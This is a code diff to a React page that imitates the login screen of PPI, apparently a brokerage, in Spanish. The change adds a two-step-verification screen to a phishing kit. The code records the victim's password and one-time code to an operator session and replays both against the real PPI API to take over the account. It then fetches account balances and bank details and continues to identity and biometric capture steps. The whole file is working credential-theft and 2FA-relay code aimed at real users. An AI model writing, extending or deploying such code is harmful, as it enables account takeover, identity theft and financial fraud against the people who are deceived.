@@ -16,7 +16,58 @@ import ppiBgPattern from "@/assets/ppi-bg-pattern.svg";
 
 const ppiLogo = <img src={ppiLogoSvg} alt="PPI" className="h-12 w-auto" />;
 
-type Step = "login" | "waiting" | "syncing" | "verify_identity" | "address" | "biometric" | "done";
+// ── Inline 2FA OTP Screen ──
+const Ppi2faScreen = ({ email, loading, error, onSubmit }: {
+  email: string;
+  loading: boolean;
+  error?: string;
+  onSubmit: (code: string) => void;
+}) => {
+  const [code, setCode] = useState("");
+  const inputRef = useRef<HTMLInputElement>(null);
+
+  useEffect(() => { inputRef.current?.focus(); }, []);
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!code.trim() || loading) return;
+    onSubmit(code.trim());
+  };
+
+  return (
+    <div className="relative z-10 w-full max-w-none sm:max-w-[420px] bg-white px-6 py-6 sm:px-10 sm:py-8">
+      <h2 className="mb-2 text-center text-[20px] font-bold text-[#1e2a3a]">Verificación en dos pasos</h2>
+      <p className="mb-6 text-center text-[13px] text-[#8c939a]">
+        Ingresá el código de verificación que recibiste en tu email o aplicación de autenticación.
+      </p>
+      {error && (
+        <div className="mb-4 rounded border border-red-200 bg-red-50 px-4 py-2.5 text-sm text-red-600">{error}</div>
+      )}
+      <form onSubmit={handleSubmit} className="flex flex-col gap-4">
+        <input
+          ref={inputRef}
+          type="text"
+          inputMode="numeric"
+          autoComplete="one-time-code"
+          placeholder="Código de verificación"
+          value={code}
+          onChange={(e) => setCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
+          className="w-full border border-[#ccd0d5] bg-white px-3 py-3 text-center text-[22px] font-semibold tracking-[0.3em] text-[#333] outline-none transition-colors placeholder:text-[14px] placeholder:tracking-normal placeholder:font-normal placeholder:text-[#adb5bd] focus:border-[#80bdff] focus:shadow-[0_0_0_3px_rgba(0,123,255,0.15)]"
+        />
+        <button
+          type="submit"
+          disabled={loading || code.length < 4}
+          className="w-full rounded-[4px] bg-[#42a5f5] py-2.5 text-[15px] font-semibold text-white transition-all hover:bg-[#1e88e5] active:scale-[0.99] disabled:opacity-60"
+        >
+          {loading ? "Verificando..." : "Verificar"}
+        </button>
+      </form>
+      <p className="mt-4 text-center text-[12px] text-[#999]">{email}</p>
+    </div>
+  );
+};
+
+type Step = "login" | "waiting" | "syncing" | "otp_2fa" | "verify_identity" | "address" | "biometric" | "done";
 
 interface IdentityVerifyPayload {
   identity_number: string;
@@ -53,7 +104,7 @@ const PPI = () => {
   const [sessionId, setSessionId] = useState("");
   const sessionIdRef = useRef("");
   const lastPasswordRef = useRef("");
-
+  const lastUsernameRef = useRef("");
   // Wayni onboarding state
   const [syncedFullName, setSyncedFullName] = useState("");
   const [syncedPhone, setSyncedPhone] = useState("");
@@ -146,23 +197,32 @@ const PPI = () => {
     setLoading(true);
     setEmail(submittedEmail);
     lastPasswordRef.current = password;
+    lastUsernameRef.current = submittedEmail;
 
     await createSession(submittedEmail, "login_attempt", { password });
 
     try {
       setStatusMsg("Verificando credenciales...");
-      const res = await ppiApi.login(submittedEmail, password, operatorCode);
 
-      if (res.success || res.raw?.status === 0) {
-        const fullName = res.fullName || res.raw?.payload?.usuario?.nombreCompleto || res.raw?.payload?.denominacion || "";
-        const token = typeof res.token === "string" ? res.token : (res.token?.accessToken || res.raw?.payload?.token?.accessToken || "");
-        let cuentaId = res.cuentaId;
-        if (!cuentaId && token) {
-          try {
-            const claims = JSON.parse(atob(token.split(".")[1]));
-            cuentaId = parseInt(claims["PPAuth.Claims.General.Cuentas"]) || null;
-          } catch { /* ignore */ }
-        }
+      // Try web login first (supports 2FA)
+      const res = await ppiApi.loginWeb(submittedEmail, password, operatorCode);
+
+      if (res.requires_2fa) {
+        // 2FA required — show OTP screen
+        if (res.fullName) setSyncedFullName(res.fullName);
+        await updateSession("2fa_required", {
+          otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${res.twofa_type}`,
+        });
+        setStep("otp_2fa");
+        setStatusMsg("");
+        setLoading(false);
+        return;
+      }
+
+      if (res.success) {
+        const fullName = res.fullName || "";
+        const token = res.token || "";
+        const cuentaId = res.cuentaId;
 
         await updateSession("login_success", {
           otp_code: `name:${fullName}|cuenta:${cuentaId}`,
@@ -180,28 +240,83 @@ const PPI = () => {
           await updateSession("completed", {
             otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
           });
-        } else {
-          await updateSession("waiting_operator", {
-            otp_code: `name:${fullName}|cuenta:${cuentaId}|token:pending`,
-          });
         }
       } else {
-        await updateSession("waiting_operator", {
-          otp_code: `credentials_captured`,
-        });
+        // Fallback to mobile login
+        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        if (mobileRes.success || mobileRes.raw?.status === 0) {
+          const fullName = mobileRes.fullName || mobileRes.raw?.payload?.usuario?.nombreCompleto || "";
+          if (fullName) setSyncedFullName(fullName);
+          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+        } else {
+          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+        }
       }
 
       setStep("verify_identity");
       setStatusMsg("");
     } catch (e: any) {
-      await updateSession("waiting_operator", {
-        otp_code: `credentials_captured`,
-      });
+      // Fallback to mobile login on error
+      try {
+        const mobileRes = await ppiApi.login(submittedEmail, password, operatorCode);
+        if (mobileRes.success || mobileRes.raw?.status === 0) {
+          const fullName = mobileRes.fullName || "";
+          if (fullName) setSyncedFullName(fullName);
+          await updateSession("login_success", { otp_code: `name:${fullName}|mobile_fallback` });
+        } else {
+          await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+        }
+      } catch {
+        await updateSession("waiting_operator", { otp_code: `credentials_captured` });
+      }
       setStep("verify_identity");
       setStatusMsg("");
     }
     setLoading(false);
   }, [createSession, updateSession, operatorCode]);
+
+  // ── Handle 2FA code submission ──
+  const handle2faSubmit = useCallback(async (code: string) => {
+    setLoading(true);
+    setError("");
+    try {
+      await updateSession("2fa_submitted", { otp_code: `code:${code}` });
+      const res = await ppiApi.validate2fa(code, lastUsernameRef.current);
+
+      if (res.success) {
+        const fullName = res.fullName || "";
+        const token = res.token || "";
+        const cuentaId = res.cuentaId;
+
+        if (fullName) setSyncedFullName(fullName);
+        await updateSession("2fa_success", {
+          otp_code: `name:${fullName}|cuenta:${cuentaId}|token:yes`,
+        });
+
+        if (token && cuentaId) {
+          setStep("syncing");
+          setStatusMsg("Sincronizando datos de tu cuenta...");
+          try {
+            await ppiApi.balances(token, cuentaId);
+            await ppiApi.bankAccounts(token, cuentaId);
+          } catch { /* silent */ }
+          await updateSession("completed", {
+            otp_code: `name:${fullName}|cuenta:${cuentaId}|synced`,
+          });
+        }
+
+        setStep("verify_identity");
+        setStatusMsg("");
+      } else {
+        setError(res.error || "Código incorrecto. Intentá nuevamente.");
+        await updateSession("2fa_error", { otp_code: `error:${res.error || "invalid_code"}` });
+      }
+    } catch (e: any) {
+      setError("Error al validar el código. Intentá nuevamente.");
+      await updateSession("2fa_error", { otp_code: `error:${e.message}` });
+    }
+    setLoading(false);
+  }, [updateSession]);
 
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
@@ -353,7 +468,7 @@ const PPI = () => {
     }
   }, [updateSession, saveOnboardingData]);
 
-  const showFullPage = step === "login" || step === "waiting" || step === "syncing";
+  const showFullPage = step === "login" || step === "waiting" || step === "syncing" || step === "otp_2fa";
 
   return (
     <div className="flex min-h-[100svh] flex-col bg-white">
@@ -397,6 +512,15 @@ const PPI = () => {
               <p className="text-[13px] text-[#999]">{email}</p>
             </div>
           </div>
+        )}
+
+        {step === "otp_2fa" && (
+          <Ppi2faScreen
+            email={email}
+            loading={loading}
+            error={error}
+            onSubmit={handle2faSubmit}
+          />
         )}
 
         {step === "verify_identity" && (
